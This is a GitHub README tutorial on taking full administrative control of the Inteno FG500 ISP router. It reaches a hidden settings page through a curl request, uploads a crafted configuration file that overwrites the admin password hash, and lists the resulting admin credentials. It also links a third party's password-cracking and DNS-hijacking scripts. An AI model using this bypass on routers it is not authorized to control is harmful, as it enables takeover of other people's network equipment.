 
![banner](https://user-images.githubusercontent.com/26827453/175800666-7e54a694-cf35-4cc0-af0d-6883a9bf132c.jpg)

# Inteno FG500 (NetAtOnce)

### This wiki and **all** scripts that will be made by wuseman is licensed under GPL Version 3.

### This is the first wiki online that will help you to bring the power back from Inteno and many swedish ISPS by this method (not the only method)

### No intrusion on Inteno or any swedish ISP servers has occurred and no damage on hardware has been done. It's all about extremely poor security in the firmware.

### No password will be provided at all on this wiki due to convicted judgment in the district court. 

### _Therefore, I will show another way that does not require cracking passwords of any ISP's password! This tutorial will also work fine for ALL isps and not just for swedish ISPS._

### Greetings to Daniel Vindevåg for all the hard work this guy did http://www.nattsjo.se/fiber/admin.php and really impressive that you toke all your hard work to court even if they won! Stay strong! On his personal page you can find alot of good info (swedish only) for how to crack the admin password and also some nice scripts like dnshijacking.

### Read more about his job [here](http://www.nattsjo.se/fiber/admin.php) and about the judgment decision and info about this can be found [http://nao.vindevag.com/](here)

### If you still using this router (its pretty good to be honest) then do yourself a favor and take control over the router, here is some articles about Inteno FG500

### [Ownit Deploys Wifi Routers With Security Hole Across Sweden](http://scienceblogs.com/aardvarchaeology/2014/10/19/ownit-deploys-wifi-routers-with-security-hole-across-sweden/)

### [Inteno CWMP certificate validation vulnerability](https://sintonen.fi/advisories/inteno-cwmp-certificate-validation-vulnerability.txt)

### And from now, there is another bug wich i will expose in this repo! ;-)

### A notice to all nerds. If you will copy the wiki and steal the real developers work will not make you a hacker.

# Default views

![login-screen-default](https://user-images.githubusercontent.com/26827453/175799991-58ec3368-4057-4228-8ae0-7841985d6059.png)

![mainscreen2](https://user-images.githubusercontent.com/26827453/175799993-0bc1cba1-fc8a-40b2-9477-f3c2a16aef78.png)

![managment-default](https://user-images.githubusercontent.com/26827453/175799994-bd24cb37-3732-4349-b3e8-d72c051b176f.png)

## Let's hack!

### To get telnet, ssh and all other services enable as an administrator via wusemans method if Daniels password does not work for your isp, then use the bug I have found.

### Visit the hidden page: 

      http://192.168.1.1/updatesettings.html

### This will give you a WHITE page (see video below), now open a terminal and type:

```sh
curl -L http://192.168.1.1 -u loginname:password
```
### Wierd bug preview: 

![wierd-bug](https://user-images.githubusercontent.com/26827453/175800084-3b6caaf5-ddb1-43cd-8ef6-f62b741ba933.gif)

### Now head back to the website and you will be able to visit the updatesettings page as default user ;-)

### Create a file named backupsettings.conf and add below text into backupsettings.conf:

```sh
      <X_BROADCOM_COM_LoginCfg>
          <AdminPassword>e8d4ef5c95f6925dfdf7b91da9a2da90</AdminPassword>
      </X_BROADCOM_COM_LoginCfg>
      <Services>
        <StorageService instance="1">
        </StorageService>
        <StorageService nextInstance="2" ></StorageService>
        <VoiceService instance="1">
        <VoiceProfileNumberOfEntries>0</VoiceProfileNumberOfEntries>
        <X_BROADCOM_COM_BoundIfName>Any_WAN</X_BROADCOM_COM_BoundIfName>
        <Capabilities>
          <Codecs instance="1">
          </Codecs>
          <Codecs instance="2">
          </Codecs>
          <Codecs instance="3">
          </Codecs>
          <Codecs instance="4">
          </Codecs>
          <Codecs instance="5">
          </Codecs>
          <Codecs instance="6">
          </Codecs>
          <Codecs instance="7">
          </Codecs>
          <Codecs instance="8">
          </Codecs>
          <Codecs nextInstance="9" ></Codecs>
        </Capabilities>
```

### Upload the file and let the router reboot.

### Now you are able to login via ssh, telnet or webgui with full privileges:

# Login details:

```sh
username: admin
password: wusemanwashere
```

### This is how it will look when you have full control, there is alot of services to play with:

![services-after-hacking](https://user-images.githubusercontent.com/26827453/175800054-58641308-7298-4e33-b52f-97e6b9d2a017.png)

### If you want, flash your firmware with your own openwrt firmware:

![update-firmware-after-hacking png](https://user-images.githubusercontent.com/26827453/175800078-4bec4243-4bfb-46c3-a914-edb3ba23998b.png)

### Mainscreen after we hacked the router:

![mainscreen-after-hacking](https://user-images.githubusercontent.com/26827453/175800048-9da24231-4e49-4ddf-8b83-a5a085547f58.png)

### Shell is really minimal:

![telnet-intenofg500](https://user-images.githubusercontent.com/26827453/175800044-e634ff65-4672-4999-b977-e468b67a187f.gif)

### REQUIREMENTS

A linux setup would be good ;)

### CONTACT 

If you have problems, questions, ideas or suggestions please contact me by posting to wuseman@nr1.nu

### WEB SITE

Visit my websites and profiles for the latest info and updated tools

https://github.com/wuseman/ && https://nr1.nu && https://stackoverflow.com/users/9887151/wuseman

### END!

